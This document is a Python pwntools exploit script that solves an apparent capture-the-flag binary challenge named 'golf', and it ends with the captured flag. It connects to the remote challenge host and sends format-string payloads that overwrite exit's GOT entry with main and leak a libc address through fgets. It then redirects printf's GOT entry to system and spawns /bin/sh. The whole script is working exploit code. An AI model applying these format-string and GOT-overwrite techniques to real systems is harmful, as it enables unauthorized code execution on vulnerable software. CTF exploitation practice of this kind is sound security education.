from os import system
import sys
from pwn import *

elf = ELF("./chall")

io = remote("golf.chal.imaginaryctf.org", 1337)
# io = process(elf.path)

offset = 0x52290 - 0x82630

# overwrite GOT of exit() to main address
payload = b'%*8$c%9$hn'
payload += b'\x00' * (0x10 - len(payload))
payload += p64(elf.sym["main"] & 0xffff)
payload += p64(elf.got["exit"])
io.sendline(payload)

# find the libc version
# payload = b'>%8$s,%9$s'
# payload += b'\x00' * (0x10 - len(payload))
# payload += p64(elf.got["printf"])
# payload += p64(elf.got["fgets"])
# io.sendline(payload)

# libc version: libc6_2.31

# libc leak
payload = b'>> %8$s'
payload += b'\x00' * (0x10 - len(payload))
payload += p64(elf.got["fgets"])
io.sendline(payload)
ret = io.recvuntil(b"> ")
ret = io.recvuntil(b"\x7f")
ret += b"\x00" * (8 - len(ret))
system_libc_addr = u64(ret) + offset

print("system addr: " + str(hex(system_libc_addr)))

# overwrite GOT of printf() to system() address
# the least significant byte of the printf() and system() addresses are equal.
payload = b'%*8$c%9$hn'
payload += b'\x00' * (0x10 - len(payload))
payload += p64((system_libc_addr >> 8) & 0xffff)
payload += p64(elf.got["printf"] + 1)
io.sendline(payload)

payload = b'/bin/sh'
io.sendline(payload)

io.interactive()

# FLAG: `ictf{useless_f0rmat_string_quirks_f0r_days_9b5d191f}`